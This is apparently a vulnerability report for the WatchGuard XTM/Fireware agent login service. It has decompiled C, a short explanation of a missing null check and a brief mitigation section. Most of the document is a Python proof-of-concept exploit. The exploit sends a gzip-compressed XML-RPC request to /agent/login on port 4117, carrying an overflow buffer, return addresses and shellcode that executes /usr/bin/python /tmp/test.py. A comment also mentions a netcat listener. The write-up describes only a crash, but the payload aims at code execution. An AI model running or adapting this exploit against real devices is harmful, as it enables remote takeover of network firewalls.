<a name="ZJ3iE"></a>
# Impact Location

```bash
int *__cdecl sub_804BC38(int a1, char *s2, _DWORD *a3)
{
  int **v3; // esi

  if ( !a1 || !s2 )
    return 0;
  v3 = *(int ***)(a1 + 12);
  if ( v3 )
  {
    while ( strcasecmp((const char *)v3[1], s2) )
    {
      v3 = (int **)*v3;
      if ( !v3 )
        goto LABEL_10;
    }
    if ( a3 )
      *a3 = v3[3];
    return v3[2];
  }
  else
  {
LABEL_10:
    if ( !a3 )
      return 0;
    *a3 = 0;
    return 0;
  }
}
```
This function does not check whether a1 is empty, and the parent function does not have a check, which causes the strcasecmp function comparison number to be empty and the process is killed.<br />![image.png](https://cdn.nlark.com/yuque/0/2024/png/35802705/1724312688055-77ca5ff6-3d40-4f73-b22a-89a02b3fa036.png#averageHue=%23e6e5e5&clientId=u652f0bef-4493-4&from=paste&height=611&id=u4cff2d35&originHeight=917&originWidth=2013&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=76238&status=done&style=none&taskId=u9a7ce5f7-0617-44cf-af9a-a415077173a&title=&width=1342)<br />![image.png](https://cdn.nlark.com/yuque/0/2024/png/35802705/1724312489018-d7ed3699-3299-4b8c-a090-c9003c30ed90.png#averageHue=%23300a24&clientId=u652f0bef-4493-4&from=paste&height=663&id=uecd90f33&originHeight=994&originWidth=2307&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=246571&status=done&style=none&taskId=u01f06fe3-bda1-4bf0-8750-8966811041f&title=&width=1538)<br />![image.png](https://cdn.nlark.com/yuque/0/2024/png/35802705/1724312503327-978f2a0b-6734-45a8-8e33-ce6b00690cdc.png#averageHue=%23807b73&clientId=u652f0bef-4493-4&from=paste&height=727&id=u9aad158b&originHeight=1091&originWidth=2347&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=304569&status=done&style=none&taskId=uf0878b4c-6310-4766-ab76-01c774df164&title=&width=1564.6666666666667)<br />![6c92cb690a1f0d6ed1fb35d0c0a8c2c9.png](https://cdn.nlark.com/yuque/0/2024/png/35802705/1724312645549-a08bb1a9-82c8-41b7-9d01-0f7f5f0f0321.png#averageHue=%230c0c0c&clientId=u652f0bef-4493-4&from=paste&height=680&id=u16c6c50a&originHeight=1020&originWidth=1920&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=77500&status=done&style=none&taskId=u19ec3b42-92a2-437d-970e-5ecbb735e17&title=&width=1280)
<a name="DfiBE"></a>
# poc

```bash
#!/usr/bin/python3

# -*- coding: utf-8 -*-

import socket

import ssl

import gzip







# Remote WatchGuard XTM or FireWare OS

R_HOST = "10.0.1.1"

# Local host with nc listener: nc -l 8.8.8.8 8888

L_HOST = "10.0.1.4"





def buildPayload(L_HOST):

    payload = "<methodCall><methodName>agent.login</methodName><params><param><value><struct><member><value><".encode()

    payload += ("A"*3181).encode()

    payload += "MFA>".encode()

    payload += ("<BBBBMFA>"*3680).encode()

    payload += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00 P@\x00\x00\x00\x00\x00h\xf9@\x00\x00\x00\x00\x00 P@\x00\x00\x00\x00\x00\x00\x00\x0e\xd6A\x00\x00\x00\x00\x00\xb1\xd5A\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00}^@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|^@\x00\x00\x00\x00\x00\xad\xd2A\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0e\xd6A\x00\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00*\xa9@\x00\x00\x00\x00\x00H\x8d=\x9d\x00\x00\x00\xbeA\x02\x00\x00\xba\xb6\x01\x00\x00\xb8\x02\x00\x00\x00\x0f\x05H\x89\x05\x92\x00\x00\x00H\x8b\x15\x93\x00\x00\x00H\x8d5\x94\x00\x00\x00H\x8b=}\x00\x00\x00\xb8\x01\x00\x00\x00\x0f\x05H\x8b=o\x00\x00\x00\xb8\x03\x00\x00\x00\x0f\x05\xb8;\x00\x00\x00H\x8d=?\x00\x00\x00H\x89= \x00\x00\x00H\x8d5A\x00\x00\x00H\x895\x1a\x00\x00\x00H\x8d5\x0b\x00\x00\x001\xd2\x0f\x05\xb8<\x00\x00\x00\x0f\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00/usr/bin/python\x00/tmp/test.py\x00\x00\x00\x00\x00\x00\x00\x00\x00\xef\x01\x00\x00\x00\x00\x00\x00'

    return gzip.compress(payload, 9)





def buildHTTP(L_HOST, R_HOST):

    http_payload = "POST /agent/login HTTP/1.1\r\n"

    http_payload += "Host: {}:4117\r\n".format(R_HOST)

    http_payload += "User-Agent: CVE\r\n"

    http_payload += "Accept-Encoding: gzip, deflate\r\n"

    http_payload += "Accept: */*\r\n"

    http_payload += "Connection: close\r\n"

    http_payload += "Content-Encoding: gzip\r\n"



    gzippedExploit = buildPayload(L_HOST)



    http_payload += "Content-Length: {}\r\n".format(len(gzippedExploit))

    http_payload += "\r\n"



    return http_payload.encode() + gzippedExploit





def main():

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    wrappedSocket = ssl.wrap_socket(sock=sock, cert_reqs=ssl.CERT_NONE)



    server_address = (R_HOST, 4117)

    print('connecting to {} port {}'.format(*server_address))



    wrappedSocket.settimeout(3)

    try:

        wrappedSocket.connect(server_address)

        print("sending payload...")

        payload = buildHTTP(L_HOST, R_HOST)

        wrappedSocket.sendall(payload)

    except:

        pass



    finally:

        print('closing socket')

        wrappedSocket.close()





main()
```

<a name="ncHdG"></a>
# Temporary protection advice
Restrict access to the management page IP.
<a name="ERaFs"></a>
# Restoration suggestions
Added detection of whether the xml parameter is empty.


